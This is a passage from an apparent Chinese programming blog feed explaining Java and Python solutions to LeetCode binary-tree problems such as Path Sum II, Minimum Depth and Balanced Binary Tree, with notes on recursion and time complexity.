<p>方法是正确的，可惜太慢了(17ms)。因为本身使用stack来遍历就是非常慢的。所以尝试着用前序遍历的递归方法，这种方法比前面一种快一些(13ms)，但是写的过程中比较容易出错。特别是需要注意要先保存root.left和root.right，因为在递归时会发生改变。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> TreeNode prevNode ;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatten</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (prevNode != <span class="keyword">null</span>) prevNode.right = root;</span><br><span class="line">    TreeNode left = root.left, right = root.right;</span><br><span class="line">    root.left = <span class="keyword">null</span>;</span><br><span class="line">    prevNode = root;</span><br><span class="line">    flatten(left);</span><br><span class="line">    flatten(right);</span><br></pre></td></tr></table></figure>
<p>论坛上有一种非常完美的方案，使用后序遍历的递归方法，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> TreeNode prev = <span class="keyword">null</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatten</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    flatten(root.right);</span><br><span class="line">    flatten(root.left);</span><br><span class="line">    root.right = prev;</span><br><span class="line">    root.left = <span class="keyword">null</span>;</span><br><span class="line">    prev = root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[113. Path Sum II]]></title>
      <url>/wiki/2017/10/30/Leetcode-113-Path-Sum-II/</url>
      <content type="html"><![CDATA[<p>Given a binary tree and a sum, find all root-to-leaf paths where each path’s sum equals the given sum.</p>
<p>Note: A leaf is a node with no children.</p>
<p>Example:</p>
<p>Given the below binary tree and <code>sum = 22</code>,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      5</span><br><span class="line">     / \</span><br><span class="line">    4   8</span><br><span class="line">   /   / \</span><br><span class="line">  11  13  4</span><br><span class="line"> /  \    / \</span><br><span class="line">7    2  5   1</span><br></pre></td></tr></table></figure>
<p>Return:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">   [5,4,11,2],</span><br><span class="line">   [5,8,4,5]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目是112. Path Sum的加强版。Q112中只需要给出是否存在这样一条路径：路径开始于根节点，终止于叶子节点，并且路径的和为给定值。现在，更进一步，需要给出具体的路径。一种很自然的想法是，改进Q112算法，传递一个List参数，依次保存访问过的节点为路径，最后保存符合要求的路径。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;List&lt;Integer&gt;&gt; paths = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; pathSum(TreeNode root, <span class="keyword">int</span> sum) &#123;</span><br><span class="line">    findPathSum(root, sum, <span class="keyword">new</span> ArrayList&lt;&gt;());</span><br><span class="line">    <span class="keyword">return</span> paths;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">findPathSum</span><span class="params">(TreeNode root, <span class="keyword">int</span> sum, ArrayList&lt;Integer&gt; list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    list.add(root.val);</span><br><span class="line">    <span class="keyword">if</span> (root.left == <span class="keyword">null</span> &amp;&amp; root.right == <span class="keyword">null</span> &amp;&amp; sum == root.val) &#123;</span><br><span class="line">        paths.add(list);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> newSum = sum - root.val;</span><br><span class="line">    findPathSum(root.left, newSum, (ArrayList&lt;Integer&gt;) list.clone());</span><br><span class="line">    findPathSum(root.right, newSum, list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用Backtracking的思想，删除访问过的元素， 稍微快一点：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;List&lt;Integer&gt;&gt; paths = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; pathSum(TreeNode root, <span class="keyword">int</span> sum) &#123;</span><br><span class="line">    findPathSum(root, sum, <span class="keyword">new</span> ArrayList&lt;&gt;());</span><br><span class="line">    <span class="keyword">return</span> paths;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">findPathSum</span><span class="params">(TreeNode root, <span class="keyword">int</span> sum, ArrayList&lt;Integer&gt; list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    list.add(root.val);</span><br><span class="line">    <span class="keyword">if</span> (root.left == <span class="keyword">null</span> &amp;&amp; root.right == <span class="keyword">null</span> &amp;&amp; sum == root.val) &#123;</span><br><span class="line">        paths.add(<span class="keyword">new</span> ArrayList&lt;&gt;(list));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> newSum = sum - root.val;</span><br><span class="line">    findPathSum(root.right, newSum, list);</span><br><span class="line">    findPathSum(root.left, newSum, list);</span><br><span class="line">    list.remove(list.size() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为什么只删除一次呢？因为到了叶子结点的时候，它的左子节点和右子节点都是null，所以相当于删除了该叶子节点。</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[17. Letter Combinations of a Phone Number.md]]></title>
      <url>/wiki/2017/10/30/Leetcode-17-Letter-Combinations-of-a-Phone-Number/</url>
      <content type="html"><![CDATA[<p>Given a digit string, return all possible letter combinations that the number could represent.</p>
<p>A mapping of digit to letters (just like on the telephone buttons) is given below.</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15205857846860.png" alt=""></p>
<pre><code>Input: Digit string &quot;23&quot;
Output: [&quot;ad&quot;, &quot;ae&quot;, &quot;af&quot;, &quot;bd&quot;, &quot;be&quot;, &quot;bf&quot;, &quot;cd&quot;, &quot;ce&quot;, &quot;cf&quot;].
</code></pre><p><strong>Note</strong>: Although the above answer is in lexicographical order, your answer could be in any order you want.</p>
<p>手机按键上每个数字都对应了多个字母，如2对应了”abc”，现给出一个数字串，要求把其中的每个数字都转化为对应的字母中的一个，列出所有的组合情况。</p>
<pre><code>输入: digits=&quot;23&quot; 输出: [&quot;ad&quot;, &quot;ae&quot;, &quot;af&quot;, &quot;bd&quot;, &quot;be&quot;, &quot;bf&quot;, &quot;cd&quot;, &quot;ce&quot;, &quot;cf&quot;]
</code></pre><p><strong>注意点</strong>：对结果的排列顺序没有要求</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">letterCombinations</span><span class="params">(self, digits)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type digits: str</span></span><br><span class="line"><span class="string">        :rtype: List[str]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># 特殊情况，空字符串</span></span><br><span class="line">        n = len(digits)</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        </span><br><span class="line">        self.dict = &#123;<span class="string">"1"</span>:<span class="string">""</span>, <span class="string">"2"</span>:<span class="string">"abc"</span>, <span class="string">"3"</span>:<span class="string">"def"</span>, <span class="string">"4"</span>:<span class="string">"ghi"</span>, <span class="string">"5"</span>:<span class="string">"jkl"</span>, <span class="string">"6"</span>:<span class="string">"mno"</span>, <span class="string">"7"</span>:<span class="string">"pqrs"</span>,<span class="string">"8"</span>:<span class="string">"tuv"</span>,<span class="string">"9"</span>:<span class="string">"wxyz"</span>,<span class="string">"10"</span>:<span class="string">" "</span>&#125;</span><br><span class="line">        </span><br><span class="line">        result = [<span class="string">""</span>]</span><br><span class="line">        <span class="keyword">for</span> digit <span class="keyword">in</span> digits:</span><br><span class="line">            lst = self.dict[digit]</span><br><span class="line">            newresult = []</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> lst:</span><br><span class="line">                <span class="keyword">for</span> str <span class="keyword">in</span> result:</span><br><span class="line">                    newresult.append(str+char)</span><br><span class="line">            result = newresult</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[111. Minimum Depth of Binary Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-111-Minimum-Depth-of-Binary-Tree/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, find its minimum depth.</p>
<p>The minimum depth is the number of nodes along the shortest path from the root node down to the nearest leaf node.</p>
<p>Note: A leaf is a node with no children.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Given binary tree [3,9,20,null,null,15,7],</span><br><span class="line"></span><br><span class="line">    3</span><br><span class="line">   / \</span><br><span class="line">  9  20</span><br><span class="line">    /  \</span><br><span class="line">   15   7</span><br><span class="line">return its minimum depth = 2.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>DFS版本的递归：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> left = minDepth(root.left);</span><br><span class="line">    <span class="keyword">int</span> right = minDepth(root.right);</span><br><span class="line">    <span class="keyword">return</span> (left == <span class="number">0</span> || right == <span class="number">0</span>) ? left + right + <span class="number">1</span>: Math.min(left, right) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最关键在于判断左子树和右子树存在的情况，并区别对待。</p>
<p>类似题目: Q104. Maximum Depth of Binary Tree</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
            <tag> Breadth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[110. Balanced Binary Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-110-Balanced-Binary-Tree/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, determine if it is height-balanced.</p>
<p>For this problem, a height-balanced binary tree is defined as:</p>
<blockquote>
<p>a binary tree in which the depth of the two subtrees of every node never differ by more than 1.</p>
</blockquote>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Given the following tree [3,9,20,null,null,15,7]:</span><br><span class="line"></span><br><span class="line">    3</span><br><span class="line">   / \</span><br><span class="line">  9  20</span><br><span class="line">    /  \</span><br><span class="line">   15   7</span><br><span class="line">Return true.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Given the following tree [1,2,2,3,3,null,null,4,4]:</span><br><span class="line"></span><br><span class="line">       1</span><br><span class="line">      / \</span><br><span class="line">     2   2</span><br><span class="line">    / \</span><br><span class="line">   3   3</span><br><span class="line">  / \</span><br><span class="line"> 4   4</span><br><span class="line">Return false.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目的思路也是非常直接的，考察的是树的基本操作。要确定一棵树是不是高度平衡树，只需确定它的左子树和右子树的高度差是大于1。基于这个思路，直接上代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isBalanced</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (Math.abs(heightOfTree(root.left, <span class="number">1</span>) - heightOfTree(root.right, <span class="number">1</span>)) &gt; <span class="number">1</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> isBalanced(root.left) &amp;&amp; isBalanced(root.right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">heightOfTree</span><span class="params">(TreeNode root, <span class="keyword">int</span> height)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> height;</span><br><span class="line">    <span class="keyword">return</span>  Math.max(heightOfTree(root.left, height + <span class="number">1</span>),</span><br><span class="line">            heightOfTree(root.right, height + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>求二叉树高度的方法<code>heightOfTree</code>有两种方案。第一种是上面的从顶到底计数的方法。还有一种是从底向上计数的方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">heightOfTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> Math.max(heightOfTree(root.left), heightOfTree(root.right)) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>仔细观察+1所在的位置，从底到顶计数的方法看起来更简洁，因为它省去了一个参数传递。而且从底向上的方法，可以直接判断高度差是否大于1.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isBalanced</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> heightOfTree(root) != -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">heightOfTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> leftHeight = heightOfTree(root.left);</span><br><span class="line">    <span class="keyword">if</span> (leftHeight == -<span class="number">1</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightHeight = heightOfTree(root.right);</span><br><span class="line">    <span class="keyword">if</span> (rightHeight == -<span class="number">1</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (Math.abs(leftHeight - rightHeight) &gt; <span class="number">1</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> Math.max(leftHeight, rightHeight) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码巧妙的利用 -1 实现判断高度差是否大于1。</p>
<p>测试结果表明两种方法的运算速度是相同的。但是实际上两种方法的时间复杂度不同，从底向上计数并判断高度差的方法，由于只遍历了一遍二叉树，所以时间复杂度是$O(n)$. 从顶向下计数的方法在最坏情况下的复杂度是$O(n^2)$.</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[108. Convert Sorted Array to Binary Search Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-108-Convert-Sorted-Array-to-Binary-Search-Tree/</url>
      <content type="html"><![CDATA[<p>Given an array where elements are sorted in ascending order, convert it to a height balanced BST.</p>
<p>For this problem, a height-balanced binary tree is defined as a binary tree in which the depth of the two subtrees of every node never differ by more than 1.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Given the sorted array: [-10,-3,0,5,9],</span><br><span class="line"></span><br><span class="line">One possible answer is: [0,-3,9,-10,null,5], </span><br><span class="line">which represents the following height balanced BST:</span><br><span class="line"></span><br><span class="line">      0</span><br><span class="line">     / \</span><br><span class="line">   -3   9</span><br><span class="line">   /   /</span><br><span class="line"> -10  5</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>利用平衡二叉树的特点：</p>
<ul>
<li>递归。</li>
<li>每次找到排序数组的中点，中点左边的排序数组构成左子树，中点右边的排序数组构成右子树。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">sortedArrayToBST</span><span class="params">(<span class="keyword">int</span>[] num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span>  helper(num, <span class="number">0</span>, num.length - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">helper</span><span class="params">(<span class="keyword">int</span>[] num, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (low &gt; high) &#123; <span class="comment">// Done</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid = (low + high) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    TreeNode node = <span class="keyword">new</span> TreeNode(num[mid]);</span><br><span class="line">    node.left = helper(num, low, mid - <span class="number">1</span>);</span><br><span class="line">    node.right = helper(num, mid + <span class="number">1</span>, high);</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[107. Binary Tree Level Order Traversal II]]></title>
      <url>/wiki/2017/10/30/Leetcode-107-Binary-Tree-Level-Order-Traversal-II/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, return the <em>bottom-up level order</em> traversal of its nodes’ values. (ie, from left to right, level by level from leaf to root).</p>
<p>For example:</p>
<p>Given binary tree [3,9,20,null,null,15,7],</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    3</span><br><span class="line">   / \</span><br><span class="line">  9  20</span><br><span class="line">    /  \</span><br><span class="line">   15   7</span><br><span class="line">```   </span><br><span class="line">   </span><br><span class="line">return its bottom-up level order traversal as:</span><br></pre></td></tr></table></figure>
<p>[<br>  [15,7],<br>  [9,20],<br>  [3]<br>]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### Java</span><br><span class="line"></span><br><span class="line">这道题目是LeeCode 102. Binary Tree Level Order Traversal的扩展，唯一的区别是这道题目要求从底向上的遍历。所以非常直接的方法就是把LeetCode102的结果反转一下：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```Java</span><br><span class="line">public List&lt;List&lt;Integer&gt;&gt; levelOrderBottom(TreeNode root) &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; levels = new ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">    if (root == null) return levels;</span><br><span class="line">    Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;();</span><br><span class="line">    queue.offer(root);</span><br><span class="line">    while (!queue.isEmpty()) &#123;</span><br><span class="line">        List&lt;Integer&gt; curLevel = new ArrayList&lt;&gt;();</span><br><span class="line">        int size = queue.size();</span><br><span class="line">        for (int i = 0; i &lt; size; i++) &#123;</span><br><span class="line">            TreeNode node = queue.poll();</span><br><span class="line">            if (node.left != null) queue.offer(node.left);</span><br><span class="line">            if (node.right != null) queue.offer(node.right);</span><br><span class="line">            curLevel.add(node.val);</span><br><span class="line">        &#125;</span><br><span class="line">        levels.add(curLevel);</span><br><span class="line">    &#125;</span><br><span class="line">    Collections.reverse(levels);</span><br><span class="line">    return levels;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>或者使用链表，每次添加在链表首部</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrderBottom(TreeNode root) &#123;</span><br><span class="line">    LinkedList&lt;List&lt;Integer&gt;&gt; levels = <span class="keyword">new</span> LinkedList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> levels;</span><br><span class="line">    Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    queue.offer(root);</span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">        List&lt;Integer&gt; curLevel = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> size = queue.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            TreeNode node = queue.poll();</span><br><span class="line">            <span class="keyword">if</span> (node.left != <span class="keyword">null</span>) queue.offer(node.left);</span><br><span class="line">            <span class="keyword">if</span> (node.right != <span class="keyword">null</span>) queue.offer(node.right);</span><br><span class="line">            curLevel.add(node.val);</span><br><span class="line">        &#125;</span><br><span class="line">        levels.addFirst(curLevel);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> levels;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Breath-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[105. Construct Binary Tree from Preorder and Inorder Traversal]]></title>
      <url>/wiki/2017/10/30/Leetcode-105-Construct-Binary-Tree-from-Preorder-and-Inorder-Traversal/</url>
      <content type="html"><![CDATA[<p>Given preorder and inorder traversal of a tree, construct the binary tree.</p>
<p>Note:<br>You may assume that duplicates do not exist in the tree.</p>
<p>For example, given</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preorder = [3,9,20,15,7]</span><br><span class="line">inorder = [9,3,15,20,7]</span><br></pre></td></tr></table></figure>
<p>Return the following binary tree:</p>
